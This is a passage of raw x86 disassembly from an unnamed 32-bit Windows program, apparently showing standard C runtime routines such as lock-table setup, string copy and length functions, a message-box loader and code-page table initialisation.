  4254d7:	mov    DWORD PTR [eax],edi
  4254d9:	push   0xfa0
  4254de:	push   DWORD PTR [eax]
  4254e0:	add    edi,0x18
  4254e3:	call   0x4264bd
  4254e8:	test   eax,eax
  4254ea:	pop    ecx
  4254eb:	pop    ecx
  4254ec:	je     0x4254fa
  4254ee:	inc    esi
  4254ef:	cmp    esi,0x24
  4254f2:	jl     0x4254c6
  4254f4:	xor    eax,eax
  4254f6:	inc    eax
  4254f7:	pop    edi
  4254f8:	pop    esi
  4254f9:	ret    
  4254fa:	and    DWORD PTR [esi*8+0x462e10],0x0
  425502:	xor    eax,eax
  425504:	jmp    0x4254f7
  425506:	push   ebx
  425507:	mov    ebx,DWORD PTR ds:0x4290cc
  42550d:	push   esi
  42550e:	mov    esi,0x462e10
  425513:	push   edi
  425514:	mov    edi,DWORD PTR [esi]
  425516:	test   edi,edi
  425518:	je     0x42552d
  42551a:	cmp    DWORD PTR [esi+0x4],0x1
  42551e:	je     0x42552d
  425520:	push   edi
  425521:	call   ebx
  425523:	push   edi
  425524:	call   0x42603a
  425529:	and    DWORD PTR [esi],0x0
  42552c:	pop    ecx
  42552d:	add    esi,0x8
  425530:	cmp    esi,0x462f30
  425536:	jl     0x425514
  425538:	mov    esi,0x462e10
  42553d:	pop    edi
  42553e:	mov    eax,DWORD PTR [esi]
  425540:	test   eax,eax
  425542:	je     0x42554d
  425544:	cmp    DWORD PTR [esi+0x4],0x1
  425548:	jne    0x42554d
  42554a:	push   eax
  42554b:	call   ebx
  42554d:	add    esi,0x8
  425550:	cmp    esi,0x462f30
  425556:	jl     0x42553e
  425558:	pop    esi
  425559:	pop    ebx
  42555a:	ret    
  42555b:	push   ebp
  42555c:	mov    ebp,esp
  42555e:	mov    eax,DWORD PTR [ebp+0x8]
  425561:	push   DWORD PTR [eax*8+0x462e10]
  425568:	call   DWORD PTR ds:0x4290f0
  42556e:	pop    ebp
  42556f:	ret    
  425570:	push   ebp
  425571:	mov    ebp,esp
  425573:	push   esi
  425574:	mov    esi,DWORD PTR [ebp+0x8]
  425577:	lea    esi,[esi*8+0x462e10]
  42557e:	cmp    DWORD PTR [esi],0x0
  425581:	je     0x425588
  425583:	xor    eax,eax
  425585:	inc    eax
  425586:	jmp    0x4255ec
  425588:	push   edi
  425589:	push   0x18
  42558b:	call   0x426152
  425590:	mov    edi,eax
  425592:	test   edi,edi
  425594:	pop    ecx
  425595:	jne    0x4255a6
  425597:	call   0x4273d0
  42559c:	mov    DWORD PTR [eax],0xc
  4255a2:	xor    eax,eax
  4255a4:	jmp    0x4255eb
  4255a6:	push   0xa
  4255a8:	call   0x4255ef
  4255ad:	cmp    DWORD PTR [esi],0x0
  4255b0:	pop    ecx
  4255b1:	jne    0x4255d9
  4255b3:	push   0xfa0
  4255b8:	push   edi
  4255b9:	call   0x4264bd
  4255be:	test   eax,eax
  4255c0:	pop    ecx
  4255c1:	pop    ecx
  4255c2:	jne    0x4255d5
  4255c4:	push   edi
  4255c5:	call   0x42603a
  4255ca:	push   0xa
  4255cc:	call   0x42555b
  4255d1:	pop    ecx
  4255d2:	pop    ecx
  4255d3:	jmp    0x425597
  4255d5:	mov    DWORD PTR [esi],edi
  4255d7:	jmp    0x4255e0
  4255d9:	push   edi
  4255da:	call   0x42603a
  4255df:	pop    ecx
  4255e0:	push   0xa
  4255e2:	call   0x42555b
  4255e7:	xor    eax,eax
  4255e9:	pop    ecx
  4255ea:	inc    eax
  4255eb:	pop    edi
  4255ec:	pop    esi
  4255ed:	pop    ebp
  4255ee:	ret    
  4255ef:	push   ebp
  4255f0:	mov    ebp,esp
  4255f2:	mov    eax,DWORD PTR [ebp+0x8]
  4255f5:	push   esi
  4255f6:	lea    esi,[eax*8+0x462e10]
  4255fd:	cmp    DWORD PTR [esi],0x0
  425600:	jne    0x425615
  425602:	push   eax
  425603:	call   0x425570
  425608:	test   eax,eax
  42560a:	pop    ecx
  42560b:	jne    0x425615
  42560d:	push   0x11
  42560f:	call   0x4244fc
  425614:	pop    ecx
  425615:	push   DWORD PTR [esi]
  425617:	call   DWORD PTR ds:0x4290f4
  42561d:	pop    esi
  42561e:	pop    ebp
  42561f:	ret    
  425620:	push   esi
  425621:	push   DWORD PTR ds:0x463d68
  425627:	call   0x427586
  42562c:	pop    ecx
  42562d:	mov    ecx,DWORD PTR ds:0x463d64
  425633:	mov    esi,eax
  425635:	mov    eax,ds:0x463d68
  42563a:	mov    edx,ecx
  42563c:	sub    edx,eax
  42563e:	add    edx,0x4
  425641:	cmp    esi,edx
  425643:	jae    0x425693
  425645:	mov    ecx,0x800
  42564a:	cmp    esi,ecx
  42564c:	jae    0x425650
  42564e:	mov    ecx,esi
  425650:	add    ecx,esi
  425652:	push   ecx
  425653:	push   eax
  425654:	call   0x4273d9
  425659:	test   eax,eax
  42565b:	pop    ecx
  42565c:	pop    ecx
  42565d:	jne    0x425676
  42565f:	add    esi,0x10
  425662:	push   esi
  425663:	push   DWORD PTR ds:0x463d68
  425669:	call   0x4273d9
  42566e:	test   eax,eax
  425670:	pop    ecx
  425671:	pop    ecx
  425672:	jne    0x425676
  425674:	pop    esi
  425675:	ret    
  425676:	mov    ecx,DWORD PTR ds:0x463d64
  42567c:	sub    ecx,DWORD PTR ds:0x463d68
  425682:	mov    ds:0x463d68,eax
  425687:	sar    ecx,0x2
  42568a:	lea    ecx,[eax+ecx*4]
  42568d:	mov    DWORD PTR ds:0x463d64,ecx
  425693:	mov    DWORD PTR [ecx],edi
  425695:	add    DWORD PTR ds:0x463d64,0x4
  42569c:	mov    eax,edi
  42569e:	pop    esi
  42569f:	ret    
  4256a0:	push   0x80
  4256a5:	call   0x426152
  4256aa:	test   eax,eax
  4256ac:	pop    ecx
  4256ad:	mov    ds:0x463d68,eax
  4256b2:	jne    0x4256b8
  4256b4:	push   0x18
  4256b6:	pop    eax
  4256b7:	ret    
  4256b8:	and    DWORD PTR [eax],0x0
  4256bb:	mov    eax,ds:0x463d68
  4256c0:	mov    ds:0x463d64,eax
  4256c5:	xor    eax,eax
  4256c7:	ret    
  4256c8:	push   0xc
  4256ca:	push   0x429618
  4256cf:	call   0x425434
  4256d4:	call   0x424747
  4256d9:	and    DWORD PTR [ebp-0x4],0x0
  4256dd:	mov    edi,DWORD PTR [ebp+0x8]
  4256e0:	call   0x425620
  4256e5:	mov    DWORD PTR [ebp-0x1c],eax
  4256e8:	or     DWORD PTR [ebp-0x4],0xffffffff
  4256ec:	call   0x4256fa
  4256f1:	mov    eax,DWORD PTR [ebp-0x1c]
  4256f4:	call   0x42546f
  4256f9:	ret    
  4256fa:	call   0x424750
  4256ff:	ret    
  425700:	push   DWORD PTR [esp+0x4]
  425704:	call   0x4256c8
  425709:	neg    eax
  42570b:	sbb    eax,eax
  42570d:	neg    eax
  42570f:	pop    ecx
  425710:	dec    eax
  425711:	ret    
  425712:	push   ebp
  425713:	mov    ebp,esp
  425715:	sub    esp,0x10
  425718:	push   ebx
  425719:	xor    ebx,ebx
  42571b:	cmp    DWORD PTR ds:0x463870,ebx
  425721:	push   esi
  425722:	push   edi
  425723:	jne    0x425792
  425725:	push   0x429688
  42572a:	call   DWORD PTR ds:0x4290f8
  425730:	mov    edi,eax
  425732:	cmp    edi,ebx
  425734:	je     0x4257cd
  42573a:	mov    esi,DWORD PTR ds:0x429028
  425740:	push   0x42967c
  425745:	push   edi
  425746:	call   esi
  425748:	test   eax,eax
  42574a:	mov    ds:0x463870,eax
  42574f:	je     0x4257cd
  425751:	push   0x42966c
  425756:	push   edi
  425757:	call   esi
  425759:	push   0x429658
  42575e:	push   edi
  42575f:	mov    ds:0x463874,eax
  425764:	call   esi
  425766:	cmp    DWORD PTR ds:0x4635c4,0x2
  42576d:	mov    ds:0x463878,eax
  425772:	jne    0x425792
  425774:	push   0x42963c
  425779:	push   edi
  42577a:	call   esi
  42577c:	test   eax,eax
  42577e:	mov    ds:0x463880,eax
  425783:	je     0x425792
  425785:	push   0x429624
  42578a:	push   edi
  42578b:	call   esi
  42578d:	mov    ds:0x46387c,eax
  425792:	mov    eax,ds:0x46387c
  425797:	test   eax,eax
  425799:	je     0x4257d7
  42579b:	call   eax
  42579d:	test   eax,eax
  42579f:	je     0x4257be
  4257a1:	lea    ecx,[ebp-0x4]
  4257a4:	push   ecx
  4257a5:	push   0xc
  4257a7:	lea    ecx,[ebp-0x10]
  4257aa:	push   ecx
  4257ab:	push   0x1
  4257ad:	push   eax
  4257ae:	call   DWORD PTR ds:0x463880
  4257b4:	test   eax,eax
  4257b6:	je     0x4257be
  4257b8:	test   BYTE PTR [ebp-0x8],0x1
  4257bc:	jne    0x4257d7
  4257be:	cmp    DWORD PTR ds:0x4635d0,0x4
  4257c5:	jb     0x4257d1
  4257c7:	or     BYTE PTR [ebp+0x12],0x20
  4257cb:	jmp    0x4257f6
  4257cd:	xor    eax,eax
  4257cf:	jmp    0x425806
  4257d1:	or     BYTE PTR [ebp+0x12],0x4
  4257d5:	jmp    0x4257f6
  4257d7:	mov    eax,ds:0x463874
  4257dc:	test   eax,eax
  4257de:	je     0x4257f6
  4257e0:	call   eax
  4257e2:	mov    ebx,eax
  4257e4:	test   ebx,ebx
  4257e6:	je     0x4257f6
  4257e8:	mov    eax,ds:0x463878
  4257ed:	test   eax,eax
  4257ef:	je     0x4257f6
  4257f1:	push   ebx
  4257f2:	call   eax
  4257f4:	mov    ebx,eax
  4257f6:	push   DWORD PTR [ebp+0x10]
  4257f9:	push   DWORD PTR [ebp+0xc]
  4257fc:	push   DWORD PTR [ebp+0x8]
  4257ff:	push   ebx
  425800:	call   DWORD PTR ds:0x463870
  425806:	pop    edi
  425807:	pop    esi
  425808:	pop    ebx
  425809:	leave  
  42580a:	ret    
  42580b:	int3   
  42580c:	int3   
  42580d:	int3   
  42580e:	int3   
  42580f:	int3   
  425810:	push   edi
  425811:	mov    edi,DWORD PTR [esp+0x8]
  425815:	jmp    0x425885
  425817:	lea    esp,[esp+0x0]
  42581e:	mov    edi,edi
  425820:	mov    ecx,DWORD PTR [esp+0x4]
  425824:	push   edi
  425825:	test   ecx,0x3
  42582b:	je     0x425840
  42582d:	mov    al,BYTE PTR [ecx]
  42582f:	add    ecx,0x1
  425832:	test   al,al
  425834:	je     0x425873
  425836:	test   ecx,0x3
  42583c:	jne    0x42582d
  42583e:	mov    edi,edi
  425840:	mov    eax,DWORD PTR [ecx]
  425842:	mov    edx,0x7efefeff
  425847:	add    edx,eax
  425849:	xor    eax,0xffffffff
  42584c:	xor    eax,edx
  42584e:	add    ecx,0x4
  425851:	test   eax,0x81010100
  425856:	je     0x425840
  425858:	mov    eax,DWORD PTR [ecx-0x4]
  42585b:	test   al,al
  42585d:	je     0x425882
  42585f:	test   ah,ah
  425861:	je     0x42587d
  425863:	test   eax,0xff0000
  425868:	je     0x425878
  42586a:	test   eax,0xff000000
  42586f:	je     0x425873
  425871:	jmp    0x425840
  425873:	lea    edi,[ecx-0x1]
  425876:	jmp    0x425885
  425878:	lea    edi,[ecx-0x2]
  42587b:	jmp    0x425885
  42587d:	lea    edi,[ecx-0x3]
  425880:	jmp    0x425885
  425882:	lea    edi,[ecx-0x4]
  425885:	mov    ecx,DWORD PTR [esp+0xc]
  425889:	test   ecx,0x3
  42588f:	je     0x4258ae
  425891:	mov    dl,BYTE PTR [ecx]
  425893:	add    ecx,0x1
  425896:	test   dl,dl
  425898:	je     0x425900
  42589a:	mov    BYTE PTR [edi],dl
  42589c:	add    edi,0x1
  42589f:	test   ecx,0x3
  4258a5:	jne    0x425891
  4258a7:	jmp    0x4258ae
  4258a9:	mov    DWORD PTR [edi],edx
  4258ab:	add    edi,0x4
  4258ae:	mov    edx,0x7efefeff
  4258b3:	mov    eax,DWORD PTR [ecx]
  4258b5:	add    edx,eax
  4258b7:	xor    eax,0xffffffff
  4258ba:	xor    eax,edx
  4258bc:	mov    edx,DWORD PTR [ecx]
  4258be:	add    ecx,0x4
  4258c1:	test   eax,0x81010100
  4258c6:	je     0x4258a9
  4258c8:	test   dl,dl
  4258ca:	je     0x425900
  4258cc:	test   dh,dh
  4258ce:	je     0x4258f7
  4258d0:	test   edx,0xff0000
  4258d6:	je     0x4258ea
  4258d8:	test   edx,0xff000000
  4258de:	je     0x4258e2
  4258e0:	jmp    0x4258a9
  4258e2:	mov    DWORD PTR [edi],edx
  4258e4:	mov    eax,DWORD PTR [esp+0x8]
  4258e8:	pop    edi
  4258e9:	ret    
  4258ea:	mov    WORD PTR [edi],dx
  4258ed:	mov    eax,DWORD PTR [esp+0x8]
  4258f1:	mov    BYTE PTR [edi+0x2],0x0
  4258f5:	pop    edi
  4258f6:	ret    
  4258f7:	mov    WORD PTR [edi],dx
  4258fa:	mov    eax,DWORD PTR [esp+0x8]
  4258fe:	pop    edi
  4258ff:	ret    
  425900:	mov    BYTE PTR [edi],dl
  425902:	mov    eax,DWORD PTR [esp+0x8]
  425906:	pop    edi
  425907:	ret    
  425908:	int3   
  425909:	int3   
  42590a:	int3   
  42590b:	int3   
  42590c:	int3   
  42590d:	int3   
  42590e:	int3   
  42590f:	int3   
  425910:	mov    ecx,DWORD PTR [esp+0xc]
  425914:	push   edi
  425915:	test   ecx,ecx
  425917:	je     0x4259af
  42591d:	push   esi
  42591e:	push   ebx
  42591f:	mov    ebx,ecx
  425921:	mov    esi,DWORD PTR [esp+0x14]
  425925:	test   esi,0x3
  42592b:	mov    edi,DWORD PTR [esp+0x10]
  42592f:	jne    0x42593c
  425931:	shr    ecx,0x2
  425934:	jne    0x4259bf
  42593a:	jmp    0x425963
  42593c:	mov    al,BYTE PTR [esi]
  42593e:	add    esi,0x1
  425941:	mov    BYTE PTR [edi],al
  425943:	add    edi,0x1
  425946:	sub    ecx,0x1
  425949:	je     0x425976
  42594b:	test   al,al
  42594d:	je     0x42597e
  42594f:	test   esi,0x3
  425955:	jne    0x42593c
  425957:	mov    ebx,ecx
  425959:	shr    ecx,0x2
  42595c:	jne    0x4259bf
  42595e:	and    ebx,0x3
  425961:	je     0x425976
  425963:	mov    al,BYTE PTR [esi]
  425965:	add    esi,0x1
  425968:	mov    BYTE PTR [edi],al
  42596a:	add    edi,0x1
  42596d:	test   al,al
  42596f:	je     0x4259a8
  425971:	sub    ebx,0x1
  425974:	jne    0x425963
  425976:	mov    eax,DWORD PTR [esp+0x10]
  42597a:	pop    ebx
  42597b:	pop    esi
  42597c:	pop    edi
  42597d:	ret    
  42597e:	test   edi,0x3
  425984:	je     0x42599c
  425986:	mov    BYTE PTR [edi],al
  425988:	add    edi,0x1
  42598b:	sub    ecx,0x1
  42598e:	je     0x425a2c
  425994:	test   edi,0x3
  42599a:	jne    0x425986
  42599c:	mov    ebx,ecx
  42599e:	shr    ecx,0x2
  4259a1:	jne    0x425a17
  4259a3:	mov    BYTE PTR [edi],al
  4259a5:	add    edi,0x1
  4259a8:	sub    ebx,0x1
  4259ab:	jne    0x4259a3
  4259ad:	pop    ebx
  4259ae:	pop    esi
  4259af:	mov    eax,DWORD PTR [esp+0x8]
  4259b3:	pop    edi
  4259b4:	ret    
  4259b5:	mov    DWORD PTR [edi],edx
  4259b7:	add    edi,0x4
  4259ba:	sub    ecx,0x1
  4259bd:	je     0x42595e
  4259bf:	mov    edx,0x7efefeff
  4259c4:	mov    eax,DWORD PTR [esi]
  4259c6:	add    edx,eax
  4259c8:	xor    eax,0xffffffff
  4259cb:	xor    eax,edx
  4259cd:	mov    edx,DWORD PTR [esi]
  4259cf:	add    esi,0x4
  4259d2:	test   eax,0x81010100
  4259d7:	je     0x4259b5
  4259d9:	test   dl,dl
  4259db:	je     0x425a09
  4259dd:	test   dh,dh
  4259df:	je     0x4259ff
  4259e1:	test   edx,0xff0000
  4259e7:	je     0x4259f5
  4259e9:	test   edx,0xff000000
  4259ef:	jne    0x4259b5
  4259f1:	mov    DWORD PTR [edi],edx
  4259f3:	jmp    0x425a0d
  4259f5:	and    edx,0xffff
  4259fb:	mov    DWORD PTR [edi],edx
  4259fd:	jmp    0x425a0d
  4259ff:	and    edx,0xff
  425a05:	mov    DWORD PTR [edi],edx
  425a07:	jmp    0x425a0d
  425a09:	xor    edx,edx
  425a0b:	mov    DWORD PTR [edi],edx
  425a0d:	add    edi,0x4
  425a10:	xor    eax,eax
  425a12:	sub    ecx,0x1
  425a15:	je     0x425a23
  425a17:	xor    eax,eax
  425a19:	mov    DWORD PTR [edi],eax
  425a1b:	add    edi,0x4
  425a1e:	sub    ecx,0x1
  425a21:	jne    0x425a19
  425a23:	and    ebx,0x3
  425a26:	jne    0x4259a3
  425a2c:	mov    eax,DWORD PTR [esp+0x10]
  425a30:	pop    ebx
  425a31:	pop    esi
  425a32:	pop    edi
  425a33:	ret    
  425a34:	int3   
  425a35:	int3   
  425a36:	int3   
  425a37:	int3   
  425a38:	int3   
  425a39:	int3   
  425a3a:	int3   
  425a3b:	int3   
  425a3c:	int3   
  425a3d:	int3   
  425a3e:	int3   
  425a3f:	int3   
  425a40:	mov    ecx,DWORD PTR [esp+0x4]
  425a44:	test   ecx,0x3
  425a4a:	je     0x425a70
  425a4c:	mov    al,BYTE PTR [ecx]
  425a4e:	add    ecx,0x1
  425a51:	test   al,al
  425a53:	je     0x425aa3
  425a55:	test   ecx,0x3
  425a5b:	jne    0x425a4c
  425a5d:	add    eax,0x0
  425a62:	lea    esp,[esp+0x0]
  425a69:	lea    esp,[esp+0x0]
  425a70:	mov    eax,DWORD PTR [ecx]
  425a72:	mov    edx,0x7efefeff
  425a77:	add    edx,eax
  425a79:	xor    eax,0xffffffff
  425a7c:	xor    eax,edx
  425a7e:	add    ecx,0x4
  425a81:	test   eax,0x81010100
  425a86:	je     0x425a70
  425a88:	mov    eax,DWORD PTR [ecx-0x4]
  425a8b:	test   al,al
  425a8d:	je     0x425ac1
  425a8f:	test   ah,ah
  425a91:	je     0x425ab7
  425a93:	test   eax,0xff0000
  425a98:	je     0x425aad
  425a9a:	test   eax,0xff000000
  425a9f:	je     0x425aa3
  425aa1:	jmp    0x425a70
  425aa3:	lea    eax,[ecx-0x1]
  425aa6:	mov    ecx,DWORD PTR [esp+0x4]
  425aaa:	sub    eax,ecx
  425aac:	ret    
  425aad:	lea    eax,[ecx-0x2]
  425ab0:	mov    ecx,DWORD PTR [esp+0x4]
  425ab4:	sub    eax,ecx
  425ab6:	ret    
  425ab7:	lea    eax,[ecx-0x3]
  425aba:	mov    ecx,DWORD PTR [esp+0x4]
  425abe:	sub    eax,ecx
  425ac0:	ret    
  425ac1:	lea    eax,[ecx-0x4]
  425ac4:	mov    ecx,DWORD PTR [esp+0x4]
  425ac8:	sub    eax,ecx
  425aca:	ret    
  425acb:	push   0x8
  425acd:	push   0x429698
  425ad2:	call   0x425434
  425ad7:	and    DWORD PTR [ebp-0x4],0x0
  425adb:	push   0x0
  425add:	push   0x1
  425adf:	call   0x427652
  425ae4:	pop    ecx
  425ae5:	pop    ecx
  425ae6:	jmp    0x425aef
  425ae8:	xor    eax,eax
  425aea:	inc    eax
  425aeb:	ret    
  425aec:	mov    esp,DWORD PTR [ebp-0x18]
  425aef:	or     DWORD PTR [ebp-0x4],0xffffffff
  425af3:	push   0x3
  425af5:	call   DWORD PTR ds:0x42909c
  425afb:	int3   
  425afc:	cmp    ecx,DWORD PTR ds:0x462f30
  425b02:	jne    0x425b05
  425b04:	ret    
  425b05:	jmp    0x425acb
  425b0a:	movzx  eax,BYTE PTR [esp+0x4]
  425b0f:	mov    cl,BYTE PTR [esp+0xc]
  425b13:	test   BYTE PTR [eax+0x463a21],cl
  425b19:	jne    0x425b37
  425b1b:	cmp    DWORD PTR [esp+0x8],0x0
  425b20:	je     0x425b30
  425b22:	movzx  eax,WORD PTR [eax*2+0x429a92]
  425b2a:	and    eax,DWORD PTR [esp+0x8]
  425b2e:	jmp    0x425b32
  425b30:	xor    eax,eax
  425b32:	test   eax,eax
  425b34:	jne    0x425b37
  425b36:	ret    
  425b37:	xor    eax,eax
  425b39:	inc    eax
  425b3a:	ret    
  425b3b:	push   0x4
  425b3d:	push   0x0
  425b3f:	push   DWORD PTR [esp+0xc]
  425b43:	call   0x425b0a
  425b48:	add    esp,0xc
  425b4b:	ret    
  425b4c:	sub    eax,0x3a4
  425b51:	je     0x425b75
  425b53:	sub    eax,0x4
  425b56:	je     0x425b6f
  425b58:	sub    eax,0xd
  425b5b:	je     0x425b69
  425b5d:	dec    eax
  425b5e:	je     0x425b63
  425b60:	xor    eax,eax
  425b62:	ret    
  425b63:	mov    eax,0x404
  425b68:	ret    
  425b69:	mov    eax,0x412
  425b6e:	ret    
  425b6f:	mov    eax,0x804
  425b74:	ret    
  425b75:	mov    eax,0x411
  425b7a:	ret    
  425b7b:	push   edi
  425b7c:	push   0x40
  425b7e:	xor    eax,eax
  425b80:	pop    ecx
  425b81:	mov    edi,0x463a20
  425b86:	rep stos DWORD PTR es:[edi],eax
  425b88:	stos   BYTE PTR es:[edi],al
  425b89:	xor    eax,eax
  425b8b:	mov    ds:0x463b24,eax
  425b90:	mov    ds:0x463a1c,eax
  425b95:	mov    ds:0x463a14,eax
  425b9a:	mov    edi,0x463b30
  425b9f:	stos   DWORD PTR es:[edi],eax
  425ba0:	stos   DWORD PTR es:[edi],eax
  425ba1:	stos   DWORD PTR es:[edi],eax
  425ba2:	pop    edi
  425ba3:	ret    
  425ba4:	push   ebp
  425ba5:	mov    ebp,esp
  425ba7:	sub    esp,0x518
  425bad:	mov    eax,ds:0x462f30
  425bb2:	xor    eax,DWORD PTR [ebp+0x4]
  425bb5:	push   esi
  425bb6:	mov    DWORD PTR [ebp-0x4],eax
  425bb9:	lea    eax,[ebp-0x18]
  425bbc:	push   eax
  425bbd:	push   DWORD PTR ds:0x463b24
  425bc3:	call   DWORD PTR ds:0x429104
  425bc9:	cmp    eax,0x1
  425bcc:	mov    esi,0x100
  425bd1:	jne    0x425ce4
  425bd7:	xor    eax,eax
  425bd9:	mov    BYTE PTR [ebp+eax*1-0x118],al
  425be0:	inc    eax
  425be1:	cmp    eax,esi
  425be3:	jb     0x425bd9
  425be5:	mov    al,BYTE PTR [ebp-0x12]
  425be8:	test   al,al
  425bea:	mov    BYTE PTR [ebp-0x118],0x20
  425bf1:	je     0x425c29
  425bf3:	push   ebx
  425bf4:	lea    edx,[ebp-0x11]
  425bf7:	push   edi
  425bf8:	movzx  ecx,BYTE PTR [edx]
  425bfb:	movzx  eax,al
  425bfe:	cmp    eax,ecx
  425c00:	ja     0x425c1f
  425c02:	sub    ecx,eax
  425c04:	inc    ecx
  425c05:	mov    ebx,ecx
  425c07:	shr    ecx,0x2
  425c0a:	lea    edi,[ebp+eax*1-0x118]
  425c11:	mov    eax,0x20202020
  425c16:	rep stos DWORD PTR es:[edi],eax
  425c18:	mov    ecx,ebx
  425c1a:	and    ecx,0x3
  425c1d:	rep stos BYTE PTR es:[edi],al
  425c1f:	inc    edx
  425c20:	mov    al,BYTE PTR [edx]
  425c22:	inc    edx
  425c23:	test   al,al
  425c25:	jne    0x425bf8
  425c27:	pop    edi
  425c28:	pop    ebx
  425c29:	push   0x0
  425c2b:	push   DWORD PTR ds:0x463a14
  425c31:	lea    eax,[ebp-0x518]
  425c37:	push   DWORD PTR ds:0x463b24
  425c3d:	push   eax
  425c3e:	push   esi
  425c3f:	lea    eax,[ebp-0x118]
  425c45:	push   eax
  425c46:	push   0x1
  425c48:	call   0x427b58
  425c4d:	push   0x0
  425c4f:	push   DWORD PTR ds:0x463b24
  425c55:	lea    eax,[ebp-0x218]
  425c5b:	push   esi
  425c5c:	push   eax
  425c5d:	push   esi
  425c5e:	lea    eax,[ebp-0x118]
  425c64:	push   eax
  425c65:	push   esi
  425c66:	push   DWORD PTR ds:0x463a14
  425c6c:	call   0x42779c
  425c71:	push   0x0
  425c73:	push   DWORD PTR ds:0x463b24
  425c79:	lea    eax,[ebp-0x318]
  425c7f:	push   esi
  425c80:	push   eax
  425c81:	push   esi
  425c82:	lea    eax,[ebp-0x118]
  425c88:	push   eax
  425c89:	push   0x200
  425c8e:	push   DWORD PTR ds:0x463a14
  425c94:	call   0x42779c
  425c99:	add    esp,0x5c
  425c9c:	xor    eax,eax
  425c9e:	mov    cx,WORD PTR [ebp+eax*2-0x518]
  425ca6:	test   cl,0x1
  425ca9:	je     0x425cc1
  425cab:	or     BYTE PTR [eax+0x463a21],0x10
  425cb2:	mov    cl,BYTE PTR [ebp+eax*1-0x218]
  425cb9:	mov    BYTE PTR [eax+0x463b40],cl
  425cbf:	jmp    0x425cdd
  425cc1:	test   cl,0x2
  425cc4:	je     0x425cd6
  425cc6:	or     BYTE PTR [eax+0x463a21],0x20
  425ccd:	mov    cl,BYTE PTR [ebp+eax*1-0x318]
  425cd4:	jmp    0x425cb9
  425cd6:	and    BYTE PTR [eax+0x463b40],0x0
  425cdd:	inc    eax
  425cde:	cmp    eax,esi
  425ce0:	jb     0x425c9e
  425ce2:	jmp    0x425d28
  425ce4:	xor    eax,eax
  425ce6:	cmp    eax,0x41
  425ce9:	jb     0x425d04
  425ceb:	cmp    eax,0x5a
  425cee:	ja     0x425d04
  425cf0:	or     BYTE PTR [eax+0x463a21],0x10
  425cf7:	mov    cl,al
  425cf9:	add    cl,0x20
  425cfc:	mov    BYTE PTR [eax+0x463b40],cl
  425d02:	jmp    0x425d23
  425d04:	cmp    eax,0x61
  425d07:	jb     0x425d1c
  425d09:	cmp    eax,0x7a
  425d0c:	ja     0x425d1c
  425d0e:	or     BYTE PTR [eax+0x463a21],0x20
  425d15:	mov    cl,al
  425d17:	sub    cl,0x20
  425d1a:	jmp    0x425cfc
  425d1c:	and    BYTE PTR [eax+0x463b40],0x0
  425d23:	inc    eax
  425d24:	cmp    eax,esi
  425d26:	jb     0x425ce6
  425d28:	mov    ecx,DWORD PTR [ebp-0x4]
  425d2b:	xor    ecx,DWORD PTR [ebp+0x4]
  425d2e:	pop    esi
  425d2f:	call   0x425afc
  425d34:	leave  
  425d35:	ret    
  425d36:	push   ebp
  425d37:	mov    ebp,esp
  425d39:	sub    esp,0x1c
  425d3c:	mov    eax,ds:0x462f30
  425d41:	xor    eax,DWORD PTR [ebp+0x4]
  425d44:	push   ebx
  425d45:	push   esi
  425d46:	mov    esi,DWORD PTR [ebp+0x8]
  425d49:	xor    ebx,ebx
  425d4b:	cmp    esi,ebx
  425d4d:	mov    DWORD PTR [ebp-0x4],eax
  425d50:	push   edi
  425d51:	je     0x425eab
  425d57:	xor    edx,edx
  425d59:	xor    eax,eax
  425d5b:	cmp    DWORD PTR [eax+0x462f40],esi
  425d61:	je     0x425dc8
  425d63:	add    eax,0x30
  425d66:	inc    edx
  425d67:	cmp    eax,0xf0
  425d6c:	jb     0x425d5b
  425d6e:	lea    eax,[ebp-0x1c]
  425d71:	push   eax
  425d72:	push   esi
  425d73:	call   DWORD PTR ds:0x429104
  425d79:	cmp    eax,0x1
  425d7c:	jne    0x425ea3
  425d82:	push   0x40
  425d84:	xor    eax,eax
  425d86:	cmp    DWORD PTR [ebp-0x1c],0x1
  425d8a:	pop    ecx
  425d8b:	mov    edi,0x463a20
  425d90:	rep stos DWORD PTR es:[edi],eax
  425d92:	stos   BYTE PTR es:[edi],al
  425d93:	mov    DWORD PTR ds:0x463b24,esi
  425d99:	mov    DWORD PTR ds:0x463a14,ebx
  425d9f:	jbe    0x425e91
  425da5:	cmp    BYTE PTR [ebp-0x16],0x0
  425da9:	je     0x425e69
  425daf:	lea    ecx,[ebp-0x15]
  425db2:	mov    dl,BYTE PTR [ecx]
  425db4:	test   dl,dl
  425db6:	je     0x425e69
  425dbc:	movzx  eax,BYTE PTR [ecx-0x1]
  425dc0:	movzx  edx,dl
  425dc3:	jmp    0x425e59
  425dc8:	push   0x40
  425dca:	xor    eax,eax
  425dcc:	pop    ecx
  425dcd:	mov    edi,0x463a20
  425dd2:	rep stos DWORD PTR es:[edi],eax
  425dd4:	lea    ecx,[edx+edx*2]
  425dd7:	shl    ecx,0x4
  425dda:	mov    DWORD PTR [ebp-0x8],ebx
  425ddd:	stos   BYTE PTR es:[edi],al
  425dde:	lea    ebx,[ecx+0x462f50]
  425de4:	mov    al,BYTE PTR [ebx]
  425de6:	mov    esi,ebx
  425de8:	jmp    0x425e13
  425dea:	mov    dl,BYTE PTR [esi+0x1]
  425ded:	test   dl,dl
  425def:	je     0x425e17
  425df1:	movzx  eax,al
  425df4:	movzx  edi,dl
  425df7:	cmp    eax,edi
  425df9:	ja     0x425e0f
  425dfb:	mov    edx,DWORD PTR [ebp-0x8]
  425dfe:	mov    dl,BYTE PTR [edx+0x462f38]
  425e04:	or     BYTE PTR [eax+0x463a21],dl
  425e0a:	inc    eax
  425e0b:	cmp    eax,edi
  425e0d:	jbe    0x425e04
  425e0f:	inc    esi
  425e10:	inc    esi
  425e11:	mov    al,BYTE PTR [esi]
  425e13:	test   al,al
  425e15:	jne    0x425dea
  425e17:	inc    DWORD PTR [ebp-0x8]
  425e1a:	add    ebx,0x8
  425e1d:	cmp    DWORD PTR [ebp-0x8],0x4
  425e21:	jb     0x425de4
  425e23:	mov    eax,DWORD PTR [ebp+0x8]
  425e26:	mov    ds:0x463b24,eax
  425e2b:	mov    DWORD PTR ds:0x463a1c,0x1
  425e35:	call   0x425b4c
  425e3a:	lea    ecx,[ecx+0x462f44]
  425e40:	mov    esi,ecx
  425e42:	mov    edi,0x463b30
  425e47:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425e48:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425e49:	mov    ds:0x463a14,eax
  425e4e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425e4f:	jmp    0x425eb0
  425e51:	or     BYTE PTR [eax+0x463a21],0x4
  425e58:	inc    eax
